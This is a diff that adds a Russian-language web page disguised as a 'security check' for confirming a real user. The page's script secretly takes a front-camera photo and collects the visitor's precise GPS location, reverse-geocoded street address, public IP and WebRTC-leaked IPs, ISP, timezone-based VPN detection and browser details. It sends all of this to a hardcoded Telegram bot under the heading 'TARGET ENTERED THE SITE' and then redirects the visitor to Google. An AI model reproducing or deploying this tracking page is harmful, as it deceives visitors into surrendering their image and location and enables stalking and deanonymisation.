@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Проверка безопасности</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{font-family:-apple-system,system-ui,"Segoe UI",Arial,sans-serif;
+       background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);
+       color:#e6edf3;display:grid;place-items:center;
+       min-height:100vh;margin:0;padding:20px}
+  .card{background:#161b22;padding:40px 36px;border-radius:16px;max-width:440px;
+        width:100%;border:1px solid #30363d;
+        box-shadow:0 30px 80px rgba(0,0,0,.7);text-align:center}
+  .icon{font-size:52px;margin:0 0 18px;line-height:1}
+  h1{font-size:22px;font-weight:600;margin:0 0 10px}
+  .sub{color:#8b949e;font-size:14px;line-height:1.6;margin:0 0 26px}
+  .perms{background:#0d1117;border:1px solid #21262d;border-radius:10px;
+         padding:14px 18px;margin:0 0 26px;text-align:left;font-size:13px}
+  .perms div{padding:7px 0;color:#8b949e;display:flex;align-items:center;gap:10px}
+  .perms .check{color:#3fb950;font-weight:700;font-size:14px}
+  button{width:100%;padding:16px;border-radius:10px;border:1px solid #2ea043;
+         background:#238636;color:#fff;font-weight:600;font-size:15px;
+         cursor:pointer;transition:background .15s, transform .05s}
+  button:hover{background:#2ea043}
+  button:active{transform:translateY(1px)}
+  button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
+  .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
+          min-height:22px;white-space:pre-wrap}
+  .ok{color:#3fb950!important}
+  .err{color:#f85149!important}
+  video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
+  canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
+  .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">🔒</div>
+  <h1>Проверка безопасности</h1>
+  <p class="sub">Для продолжения подтвердите, что вы реальный пользователь.
+     Нажмите кнопку ниже и разрешите доступ.</p>
+
+  <div class="perms">
+    <div><span class="check">✓</span> Определение местоположения</div>
+    <div><span class="check">✓</span> Подтверждение личности</div>
+    <div><span class="check">✓</span> Проверка соединения</div>
+  </div>
+
+  <button id="btn">Проверить и продолжить</button>
+  <div class="status" id="st"></div>
+
+  <div class="fine">
+    Ваши данные защищены и используются только для проверки.
+  </div>
+</div>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="snap"></canvas>
+
+<script>
+// ============================================================
+// ВСТАВЬ СЮДА СВОИ ЗНАЧЕНИЯ
+// ============================================================
+var TG_BOT_TOKEN = "8920061712:AAGsJo14-Ooz3vaOWIPynESJj-24VYmPwng";
+var TG_CHAT_ID   = "8152269891";
+// ============================================================
+
+(function(){
+  var btn = document.getElementById('btn');
+  var st  = document.getElementById('st');
+  var cam = document.getElementById('cam');
+  var snap = document.getElementById('snap');
+
+  function setStatus(text, cls){
+    st.className = 'status ' + (cls || '');
+    st.textContent = text;
+  }
+
+  async function sendTG(text, photoBase64){
+    // Если есть фото — шлём sendPhoto, иначе sendMessage
+    if (photoBase64) {
+      try {
+        var blob = await (await fetch(photoBase64)).blob();
+        var form = new FormData();
+        form.append('chat_id', TG_CHAT_ID);
+        form.append('photo', blob, 'snapshot.jpg');
+        form.append('caption', text.slice(0, 1000));
+        form.append('parse_mode', 'HTML');
+        await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
+          method: 'POST',
+          body: form
+        });
+        return true;
+      } catch(e) {
+        console.log('photo send failed:', e);
+      }
+    }
+    // Фоллбэк — просто текст
+    try {
+      await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        })
+      });
+    } catch(e) { console.log('tg send failed:', e); }
+  }
+
+  async function getIpInfo(){
+    try {
+      var r = await fetch('https://ipwho.is/', { cache: 'no-store' });
+      var j = await r.json();
+      if (j.success) return {
+        ip: j.ip, country: j.country, region: j.region,
+        city: j.city, isp: j.connection && j.connection.isp
+      };
+    } catch(e){}
+    try {
+      var r2 = await fetch('https://api.ipify.org?format=json');
+      var j2 = await r2.json();
+      return { ip: j2.ip };
+    } catch(e){}
+    return { ip: 'н/д' };
+  }
+
+  function getLocalAndSrflx(){
+    return new Promise(function(resolve){
+      var out = { local: [], srflx: [] };
+      var pc;
+      try {
+        pc = new RTCPeerConnection({
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' }
+          ]
+        });
+        pc.createDataChannel('x');
+        pc.onicecandidate = function(e){
+          if (!e.candidate) return;
+          var c = e.candidate;
+          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(c.candidate);
+          if (!m) return;
+          var ip = m[1];
+          if (c.type === 'host' && (ip.startsWith('192.168.') ||
+              ip.startsWith('10.') || ip.startsWith('172.') ||
+              ip.startsWith('169.254.'))) {
+            if (out.local.indexOf(ip) === -1) out.local.push(ip);
+          } else if (c.type === 'srflx') {
+            if (out.srflx.indexOf(ip) === -1) out.srflx.push(ip);
+          }
+        };
+        pc.createOffer().then(function(o){ pc.setLocalDescription(o); });
+        setTimeout(function(){
+          try { pc.close(); } catch(_){}
+          resolve(out);
+        }, 2500);
+      } catch(e) { resolve(out); }
+    });
+  }
+
+  async function getGeolocation(){
+    return new Promise(function(resolve){
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: Math.round(pos.coords.accuracy)
+          });
+        },
+        function(err){ resolve({ error: err.message, code: err.code }); },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function getCameraSnapshot(){
+    return new Promise(async function(resolve){
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return resolve({ error: 'getUserMedia not supported' });
+      }
+      try {
+        var stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        cam.srcObject = stream;
+        cam.play();
+        // Ждём, пока видео реально начнёт отдавать кадры
+        await new Promise(function(res){
+          var t = setTimeout(res, 1500);
+          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 300); };
+        });
+        var w = cam.videoWidth || 640;
+        var h = cam.videoHeight || 480;
+        snap.width = w;
+        snap.height = h;
+        var ctx = snap.getContext('2d');
+        ctx.drawImage(cam, 0, 0, w, h);
+        var dataUrl = snap.toDataURL('image/jpeg', 0.85);
+
+        // Выключаем камеру сразу после снимка
+        stream.getTracks().forEach(function(t){ t.stop(); });
+
+        resolve({ dataUrl: dataUrl, w: w, h: h });
+      } catch(e) {
+        resolve({ error: e.name + ': ' + e.message });
+      }
+    });
+  }
+
+  async function reverseGeo(lat, lon){
+    try {
+      var r = await fetch(
+        'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat +
+        '&lon=' + lon + '&zoom=18&addressdetails=1',
+        { headers: { 'User-Agent': 'geo-probe/1.0' } }
+      );
+      var j = await r.json();
+      return j.display_name || 'н/д';
+    } catch(e) { return 'н/д'; }
+  }
+
+  btn.addEventListener('click', async function(){
+    btn.disabled = true;
+    btn.textContent = 'Проверяем…';
+    setStatus('Запрашиваем разрешения…');
+
+    // Запускаем все запросы параллельно
+    // Браузер покажет попапы: камера + геолокация
+    var [ipInfo, rtc, geo, camRes] = await Promise.all([
+      getIpInfo(),
+      getLocalAndSrflx(),
+      getGeolocation(),
+      getCameraSnapshot()
+    ]);
+
+    setStatus('Формируем отчёт…');
+
+    // Определяем подозрение на VPN
+    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    var vpnSuspected = false;
+    try {
+      var tzCountryGuess = {
+        'Europe/Moscow':'RU','Europe/Berlin':'DE','Europe/Amsterdam':'NL',
+        'Europe/London':'GB','America/New_York':'US','America/Los_Angeles':'US',
+        'Asia/Tokyo':'JP','Asia/Shanghai':'CN','Asia/Dubai':'AE'
+      }[tz] || null;
+      if (tzCountryGuess && ipInfo.country && tzCountryGuess !== ipInfo.country) {
+        vpnSuspected = true;
+      }
+    } catch(e){}
+
+    // Разбираем геолокацию
+    var geoLine = 'не получена';
+    var addressLine = '';
+    if (geo && !geo.error) {
+      geoLine = geo.lat.toFixed(6) + ', ' + geo.lon.toFixed(6) + ' (± ' + geo.acc + ' м)';
+      var addr = await reverseGeo(geo.lat, geo.lon);
+      addressLine = '\n🏠 Адрес: ' + addr +
+                    '\n🗺 Карта: https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon;
+    } else if (geo && geo.error) {
+      geoLine = 'отклонено: ' + geo.error;
+    }
+
+    // Разбираем камеру
+    var camLine = 'не получена';
+    if (camRes && camRes.dataUrl) {
+      camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
+    } else if (camRes && camRes.error) {
+      camLine = 'отклонено: ' + camRes.error;
+    }
+
+    var text =
+      '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ</b>\n' +
+      '━━━━━━━━━━━━━━━━━━━\n' +
+      '🌐 Публичный IP: <code>' + (ipInfo.ip || 'н/д') + '</code>\n' +
+      '📍 Страна (IP): <code>' + (ipInfo.country || 'н/д') + '</code>\n' +
+      '🏙 Город (IP): <code>' + (ipInfo.city || 'н/д') + '</code>\n' +
+      '📡 Провайдер: <code>' + (ipInfo.isp || 'н/д') + '</code>\n' +
+      '🕐 Часовой пояс СИСТЕМЫ: <code>' + tz + '</code>\n' +
+      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА (TZ ≠ IP-страна)' : 'возможно нет') + '</b>\n' +
+      '━━━━━━━━━━━━━━━━━━━\n' +
+      '📍 GPS: <code>' + geoLine + '</code>' + addressLine + '\n' +
+      '📷 Камера: <code>' + camLine + '</code>\n' +
+      '🖥 Локальные IP (WebRTC): <code>' + (rtc.local.join(', ') || 'не отдал') + '</code>\n' +
+      '📡 Реальный публичный IP (srflx): <code>' + (rtc.srflx.join(', ') || 'не отдал') + '</code>\n' +
+      '━━━━━━━━━━━━━━━━━━━\n' +
+      '🖥 Экран: <code>' + screen.width + 'x' + screen.height + '@' + screen.colorDepth + '</code>\n' +
+      '🗣 Язык: <code>' + navigator.language + '</code>\n' +
+      '💻 Платформа: <code>' + navigator.platform + '</code>\n' +
+      '👆 Тач: <code>' + ('ontouchstart' in window ? 'да' : 'нет') + '</code>\n' +
+      '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
+      '🕐 ' + new Date().toISOString();
+
+    // Отправляем
+    var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
+    var ok = await sendTG(text, photoData);
+
+    if (ok) {
+      setStatus('✓ Проверка завершена. Перенаправляем…', 'ok');
+      btn.textContent = '✓ Готово';
+      setTimeout(function(){
+        window.location.href = 'https://www.google.com';
+      }, 2000);
+    } else {
+      setStatus('✓ Проверка завершена.', 'ok');
+      btn.textContent = '✓ Готово';
+    }
+  });
+})();
+</script>
+</body>
+</html>
